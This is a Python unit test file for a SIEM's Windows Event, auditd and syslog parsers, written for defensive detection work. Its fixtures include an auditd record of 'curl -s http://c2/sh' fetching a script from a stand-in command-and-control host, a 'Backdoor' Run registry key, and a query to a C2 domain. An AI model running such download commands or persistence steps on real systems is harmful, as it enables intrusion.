"""Unit tests for Windows, Auditd, and Syslog Telemetry Parsers."""

from src.siem.models import EventCategory, EventOutcome, EventSeverity
from src.siem.parsers import AuditdParser, SyslogParser, WindowsEventParser


def test_windows_event_parser_logon_success():
    win_data = {
        "event_id": 4624,
        "computer_name": "dc01.corp.enterprise.local",
        "TargetUserName": "jdoe",
        "TargetDomainName": "CORP",
        "IpAddress": "172.28.20.25",
        "IpPort": 49152,
        "message": "An account was successfully logged on.",
    }
    event = WindowsEventParser.parse_dict(win_data)
    assert event.event.category == EventCategory.AUTHENTICATION
    assert event.event.outcome == EventOutcome.SUCCESS
    assert event.event.severity == EventSeverity.INFORMATIONAL
    assert event.user.name == "jdoe"
    assert event.user.domain == "CORP"
    assert event.source.ip == "172.28.20.25"
    assert event.raw_event is not None


def test_windows_event_parser_logon_failure():
    win_data = {
        "event_id": 4625,
        "computer_name": "dc01.corp.enterprise.local",
        "TargetUserName": "administrator",
        "IpAddress": "172.28.30.10",
        "message": "An account failed to log on.",
    }
    event = WindowsEventParser.parse_dict(win_data)
    assert event.event.category == EventCategory.AUTHENTICATION
    assert event.event.outcome == EventOutcome.FAILURE
    assert event.event.severity == EventSeverity.MEDIUM
    assert event.user.name == "administrator"
    assert event.source.ip == "172.28.30.10"


def test_windows_event_parser_sysmon_dns_and_registry():
    sysmon_reg = {
        "event_id": 13,
        "computer_name": "wkstn01.corp.enterprise.local",
        "Image": "C:\\Windows\\reg.exe",
        "TargetObject": "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Backdoor",
    }
    ev_reg = WindowsEventParser.parse_dict(sysmon_reg)
    assert ev_reg.event.category == EventCategory.REGISTRY
    assert ev_reg.registry.key == "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Backdoor"

    sysmon_dns = {
        "event_id": 22,
        "computer_name": "wkstn01.corp.enterprise.local",
        "QueryName": "malicious.c2.domain.com",
    }
    ev_dns = WindowsEventParser.parse_dict(sysmon_dns)
    assert ev_dns.event.category == EventCategory.DNS
    assert ev_dns.dns.query_name == "malicious.c2.domain.com"


def test_auditd_parser_execve_line():
    raw_audit = (
        'type=EXECVE msg=audit(1692440000.123:101): argc=3 a0="curl" a1="-s" a2="http://c2/sh" '
        'pid=14201 comm="curl" exe="/usr/bin/curl" user="sysadmin"'
    )
    event = AuditdParser.parse_line(raw_audit, hostname="srv01", source_ip="172.28.20.15")
    assert event is not None
    assert event.event.category == EventCategory.PROCESS
    assert event.event.action == "auditd.execve"
    assert event.process.name == "curl"
    assert event.process.pid == 14201
    assert event.process.command_line == "curl"
    assert event.process.executable == "/usr/bin/curl"
    assert event.user.name == "sysadmin"


def test_syslog_parser_openssh_and_sudo():
    # SSH failed password
    raw_ssh = "<85>Aug 19 12:00:00 srv01 sshd[999]: Failed password for invalid user hacker from 172.28.30.10 port 49152 ssh2"
    ev_ssh = SyslogParser.parse(raw_ssh, source_ip="172.28.20.15")
    assert ev_ssh.event.category == EventCategory.AUTHENTICATION
    assert ev_ssh.host.name == "srv01"
    assert ev_ssh.process.name == "sshd"
    assert ev_ssh.process.pid == 999
    assert ev_ssh.user.name == "hacker"

    # Sudo log
    raw_sudo = "<86>Aug 19 12:01:00 srv01 sudo[1002]: sysadmin : TTY=pts/0 ; PWD=/home/sysadmin ; USER=root ; COMMAND=/bin/bash"
    ev_sudo = SyslogParser.parse(raw_sudo, source_ip="172.28.20.15")
    assert ev_sudo.event.category == EventCategory.PROCESS
    assert ev_sudo.event.action == "linux.sudo.execution"
    assert ev_sudo.user.name == "sysadmin"
    assert "COMMAND=/bin/bash" in ev_sudo.message
